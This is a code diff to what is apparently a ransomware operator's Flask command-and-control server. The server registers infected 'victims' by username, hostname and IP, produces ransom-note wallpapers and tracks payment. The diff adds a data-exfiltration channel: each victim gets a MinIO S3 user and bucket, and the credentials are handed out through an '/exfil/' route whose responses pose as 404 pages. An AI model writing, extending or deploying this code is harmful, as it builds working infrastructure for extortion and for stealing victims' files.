@@ -6,6 +6,10 @@ from app.models import Victim, load_victim
 import random, os
 import base64
 
+MINIO_ADDRESS = "https://minio.example.com"
+MINIO_ADMIN_KEY = "minioadmin"
+MINIO_ADMIN_SECRET = "minioadmin"
+
 # Automatically creates a image file with the specified ransom note
 # The image will be saved in a publicly available manner, so that an
 # infected PC can pull it and set is as PC wallpaper
@@ -52,12 +56,16 @@ def createVictim():
         # if request.accesskey == "accesskey":
         victim_id = random.randint(0, 999999999999)
         victim_key = base64.b64encode(os.urandom(32)).decode("ascii")
+        s3_credentials = generate_s3_credentials(victim_id)
         victim = Victim(
             victim_id=victim_id,
             victim_username=request.form["username"],
             victim_hostname=request.form["hostname"],
             victim_key=victim_key,
             ip_firstContact=request.form["ip"],
+            s3_bucket=s3_credentials["bucket"],
+            s3_access_key=s3_credentials["access_key"],
+            s3_secret_key=s3_credentials["secret_key"],
         )
         db.session.add(victim)
         db.session.commit()
@@ -65,9 +73,19 @@ def createVictim():
             str(victim_id), request.form["username"], request.form["ip"]
         )
         response = make_response(render_template("404.html"), 404)
-        response.headers["Victim-Id"] = str(victim_id)
-        response.headers["Victim-Key"] = victim_key
+        response.headers["Victim-ID"] = str(victim_id)
         return response
+
+
+# Returns S3 credentials for a victim in the headers
+@app.route("/exfil/<int:victim_id>", methods=["GET"])
+def getS3credentials(victim_id):
+    victim = load_victim(victim_id)
+    response = make_response(render_template("404.html"), 404)
+    response.headers["S3-Bucket"] = victim.s3_bucket
+    response.headers["S3-Access-Key"] = victim.s3_access_key
+    response.headers["S3-Secret-Key"] = victim.s3_secret_key
+    return response
 
 
 # Checks if payment has been received by the specific victim ID.
@@ -94,3 +112,39 @@ def receivePayment(victim_id):
     db.session.commit()
     os.remove(f"./app/static/wp/{victim_id}.png")
     return redirect(url_for("displayIndex"))
+
+
+def generate_s3_credentials(victim_id):
+    """Generates a S3 bucket for the victim with the specified ID and returns the credentials in a dictionary"""
+    s3_credentials = {
+        "access_key": str(victim_id),
+        "secret_key": base64.b64encode(os.urandom(16)).decode("ascii"),
+        "bucket": f"victim-{victim_id}",
+    }
+
+    # Define alias for minio S3 admin management
+    os.system(
+        f"mclient alias set rnsm-minio {MINIO_ADDRESS} {MINIO_ADMIN_KEY} {MINIO_ADMIN_SECRET}"
+    )
+    # Create separate S3 user for the new victim
+    os.system(
+        f"mclient admin user add rnsm-minio/ {victim_id} {s3_credentials['secret_key']}"
+    )
+    # Create separate S3-bucket for the new user/victim
+    os.system(f"mclient mb rnsm-minio/{s3_credentials['bucket']}")
+    # Create policy file via template
+    with open("./app/templates/victim-policy.json", "r") as f:
+        policy = f.read()
+        policy = policy.replace("{bucket}", s3_credentials["bucket"])
+        f.close()
+    # Write edited policy to file
+    with open(f"./app/data/policy-{victim_id}.json", "w") as f:
+        f.write(policy)
+        f.close()
+    # Add custom policy to Minio deployment
+    os.system(
+        f"mclient admin policy add rnsm-minio/ policy-{victim_id} ./app/data/policy-{victim_id}.json"
+    )
+    # Apply new policy to user
+    os.system(f"mclient admin policy set rnsm-minio/ {victim_id}.json user={victim_id}")
+    return s3_credentials
